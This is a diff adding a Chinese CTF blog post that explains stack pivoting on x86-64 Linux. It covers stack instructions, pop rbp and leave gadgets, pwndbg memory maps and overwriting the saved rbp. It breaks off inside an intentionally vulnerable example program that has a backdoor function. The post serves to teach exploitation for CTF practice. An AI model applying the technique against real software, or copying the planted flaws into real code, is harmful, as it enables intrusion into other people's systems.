@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="栈迁移 之前答应某人写一篇文章讲栈迁移，这里附带一些栈相关的知识，尽可能全面的讲述栈和栈迁移，结合例题应用 文章讨论的内容都建立在x86-64 linux上\n栈相关寄存器 rsp 指向当前栈顶，决定 CPU 从哪里取返回地址与 ROP 数据 rbp 指向当前函数栈帧基址，用作稳定的栈内数据定位与栈迁移跳板 栈相关的指令 这里只讲一些需要特别注意的指令，add sub一类明显的就略过了\n">
+<title>栈迁移 - Pivoting</title>
+
+<link rel='canonical' href='http://localhost:1313/p/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/'>
+
+<link rel="stylesheet" href="/scss/style.min.07013ecaa2cce7ca7c974ddd4c5f116605e3efaeaf51d39b2ffb94b303885842.css"><meta property='og:title' content="栈迁移 - Pivoting">
+<meta property='og:description' content="栈迁移 之前答应某人写一篇文章讲栈迁移，这里附带一些栈相关的知识，尽可能全面的讲述栈和栈迁移，结合例题应用 文章讨论的内容都建立在x86-64 linux上\n栈相关寄存器 rsp 指向当前栈顶，决定 CPU 从哪里取返回地址与 ROP 数据 rbp 指向当前函数栈帧基址，用作稳定的栈内数据定位与栈迁移跳板 栈相关的指令 这里只讲一些需要特别注意的指令，add sub一类明显的就略过了\n">
+<meta property='og:url' content='http://localhost:1313/p/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/'>
+<meta property='og:site_name' content='Converter258'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2026-01-12T21:50:06&#43;08:00'/><meta property='article:modified_time' content='2026-01-12T21:50:06&#43;08:00'/><meta property='og:image' content='http://localhost:1313/p/pivoting/background.jpg' />
+<meta name="twitter:title" content="栈迁移 - Pivoting">
+<meta name="twitter:description" content="栈迁移 之前答应某人写一篇文章讲栈迁移，这里附带一些栈相关的知识，尽可能全面的讲述栈和栈迁移，结合例题应用 文章讨论的内容都建立在x86-64 linux上\n栈相关寄存器 rsp 指向当前栈顶，决定 CPU 从哪里取返回地址与 ROP 数据 rbp 指向当前函数栈帧基址，用作稳定的栈内数据定位与栈迁移跳板 栈相关的指令 这里只讲一些需要特别注意的指令，add sub一类明显的就略过了\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/pivoting/background.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_f4434711c60fa7a7.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">☘</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Converter258</a></h1>
+            <h2 class="site-description">孩子快饿死了，赏我点吃的吧</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Converter258'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#栈相关寄存器">栈相关寄存器</a>
+      <ol>
+        <li><a href="#rsp">rsp</a></li>
+        <li><a href="#rbp">rbp</a></li>
+      </ol>
+    </li>
+    <li><a href="#栈相关的指令">栈相关的指令</a>
+      <ol>
+        <li><a href="#push">push</a></li>
+        <li><a href="#pop">pop</a></li>
+        <li><a href="#call">call</a></li>
+        <li><a href="#ret">ret</a></li>
+        <li><a href="#leave">leave</a></li>
+      </ol>
+    </li>
+    <li><a href="#如何迁移">如何迁移</a>
+      <ol>
+        <li><a href="#gadget">gadget</a></li>
+        <li><a href="#迁移目标位置的选择">迁移目标位置的选择</a></li>
+        <li><a href="#迁移手法">迁移手法</a></li>
+      </ol>
+    </li>
+    <li><a href="#例题">例题</a>
+      <ol>
+        <li><a href="#exp">exp</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/">
+                <img src="/p/pivoting/background_hu_ba013d2542d5b6e.jpg"
+                        srcset="/p/pivoting/background_hu_ba013d2542d5b6e.jpg 800w, /p/pivoting/background_hu_141cc330628e22fd.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post 栈迁移 - Pivoting" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #E8F5E9; color: #2D5A27;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/">栈迁移 - Pivoting</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2026-01-12T21:50:06&#43;08:00'>2026-01-12</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="栈迁移">栈迁移
+</h1><p>之前答应某人写一篇文章讲栈迁移，这里附带一些栈相关的知识，尽可能全面的讲述栈和栈迁移，结合例题应用
+文章讨论的内容都建立在<code>x86-64 linux</code>上</p>
+<h2 id="栈相关寄存器">栈相关寄存器
+</h2><h3 id="rsp">rsp
+</h3><ul>
+<li>指向当前栈顶，决定 CPU 从哪里取返回地址与 ROP 数据</li>
+</ul>
+<h3 id="rbp">rbp
+</h3><ul>
+<li>指向当前函数栈帧基址，用作稳定的栈内数据定位与栈迁移跳板</li>
+</ul>
+<h2 id="栈相关的指令">栈相关的指令
+</h2><p>这里只讲一些需要特别注意的指令，add sub一类明显的就略过了</p>
+<h3 id="push">push
+</h3><p>push是一个压栈指令，可以将寄存器立即数或内存中的数据压入栈中，这条指令的具体操作包括</p>
+<ol>
+<li>rsp - 8</li>
+<li>将指定数据写在rsp指向的内存处
+需要注意是先rsp减小，再写入数据，当压入立即数时会先符号扩展至8字节，再压入</li>
+</ol>
+<h3 id="pop">pop
+</h3><p>pop与push相反，用于弹栈，可以将rsp处的值弹出，他的流程大致为</p>
+<ol>
+<li>弹出rsp处的值</li>
+<li>rsp + 8
+需要注意pop事实上只移动了rsp，原本rsp处弹栈的数据并不会被清理</li>
+</ol>
+<h3 id="call">call
+</h3><p>事实上call是一条隐式的push，当我们通过call调用某个地址时，实际做的是</p>
+<ol>
+<li>push rip</li>
+<li>jmp addr
+它会将call的下一条指令的地址压，并jmp到刚刚call的地址</li>
+</ol>
+<h3 id="ret">ret
+</h3><p>和call相反，ret则是一条隐式的pop，当执行ret时</p>
+<ol>
+<li>pop rip</li>
+<li>jmp rip
+会将之前call压栈的返回地址pop到rip，并跳转</li>
+</ol>
+<h3 id="leave">leave
+</h3><p>leave则是栈迁移的一条关键指令，主要作用是销毁栈
+执行的时候</p>
+<ol>
+<li>mov rsp, rbp</li>
+<li>pop rbp
+会将rsp移动到rbp处，并将当前位置的地址pop到rbp完成对rbp的移动</li>
+</ol>
+<h2 id="如何迁移">如何迁移
+</h2><p>对于迁移栈，我们的目的是将栈移动到一个更加可控的位置，或利用有限的溢出大小实现更长的ROP链，也可以通过多次栈迁移布置特定的数据结构栈风水等</p>
+<h3 id="gadget">gadget
+</h3><p>对于gadget的选取，一般有两种选择</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">retn</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">leave</span>
+</span></span><span class="line"><span class="cl"><span class="nf">retn</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这些gadget可以帮助我们控制rbp进而间接控制rsp</p>
+<h3 id="迁移目标位置的选择">迁移目标位置的选择
+</h3><p>可以通过gdb调试寻找一些可读可写的区域</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
+</span></span><span class="line"><span class="cl"><span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">WX</span> <span class="o">|</span> <span class="n">RODATA</span>
+</span></span><span class="line"><span class="cl">             <span class="n">Start</span>                <span class="n">End</span> <span class="n">Perm</span>     <span class="n">Size</span>  <span class="n">Offset</span> <span class="ne">File</span> <span class="p">(</span><span class="n">set</span> <span class="n">vmmap</span><span class="o">-</span><span class="n">prefer</span><span class="o">-</span><span class="n">relpaths</span> <span class="n">on</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x400000</span>           <span class="mh">0x401000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>       <span class="mi">0</span> <span class="n">pwn</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x401000</span>           <span class="mh">0x402000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span>    <span class="mi">1000</span> <span class="n">pwn</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x402000</span>           <span class="mh">0x403000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>    <span class="mi">2000</span> <span class="n">pwn</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x403000</span>           <span class="mh">0x404000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>    <span class="mi">2000</span> <span class="n">pwn</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x404000</span>           <span class="mh">0x405000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span>    <span class="mi">3000</span> <span class="n">pwn</span>
+</span></span><span class="line"><span class="cl">          <span class="mh">0x405000</span>           <span class="mh">0x426000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">21000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7c00000</span>     <span class="mh">0x7ffff7c28000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">28000</span>       <span class="mi">0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7c28000</span>     <span class="mh">0x7ffff7db0000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>   <span class="mi">188000</span>   <span class="mi">28000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7db0000</span>     <span class="mh">0x7ffff7dff000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">4</span><span class="n">f000</span>  <span class="mi">1</span><span class="n">b0000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7dff000</span>     <span class="mh">0x7ffff7e03000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">4000</span>  <span class="mi">1</span><span class="n">fe000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7e03000</span>     <span class="mh">0x7ffff7e05000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>  <span class="mi">202000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7e05000</span>     <span class="mh">0x7ffff7e12000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="n">d000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7e05</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fae000</span>     <span class="mh">0x7ffff7fb1000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">3000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7fae</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fbd000</span>     <span class="mh">0x7ffff7fbf000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7fbd</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fbf000</span>     <span class="mh">0x7ffff7fc3000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">4000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fc3000</span>     <span class="mh">0x7ffff7fc5000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">2000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fc5000</span>     <span class="mh">0x7ffff7fc6000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>       <span class="mi">0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7fc6000</span>     <span class="mh">0x7ffff7ff1000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>    <span class="mi">2</span><span class="n">b000</span>    <span class="mi">1000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7ff1000</span>     <span class="mh">0x7ffff7ffb000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="n">a000</span>   <span class="mi">2</span><span class="n">c000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7ffb000</span>     <span class="mh">0x7ffff7ffd000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">2000</span>   <span class="mi">36000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffff7ffd000</span>     <span class="mh">0x7ffff7fff000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>   <span class="mi">38000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7ffffffde000</span>     <span class="mh">0x7ffffffff000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">21000</span>       <span class="mi">0</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以这里为例，<code> 0x404000           0x405000 rw-p     1000    3000 pwn</code>就是一个很不错的选择</p>
+<h3 id="迁移手法">迁移手法
+</h3><p>除了最简单直接的pop rbp这类的直接操作，还有一些间接操作
+当我们向栈上读入时，如果能够覆盖到保存的rbp的值，即可在运行到leave ret时完成对栈的迁移
+所以操作可以分为如下几步</p>
+<ol>
+<li>溢出覆盖保存的rbp值为希望迁移到的地址</li>
+<li>在修改rbp后能够执行leave控制rsp</li>
+</ol>
+<h2 id="例题">例题
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;  </span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;  </span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;  </span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;  </span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">gift</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">   <span class="k">asm</span><span class="p">(</span><span class="s">&#34;pop %rdi;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ret</span><span class="s">&#34;);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;goodmorning&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x28</span><span class="p">];</span>
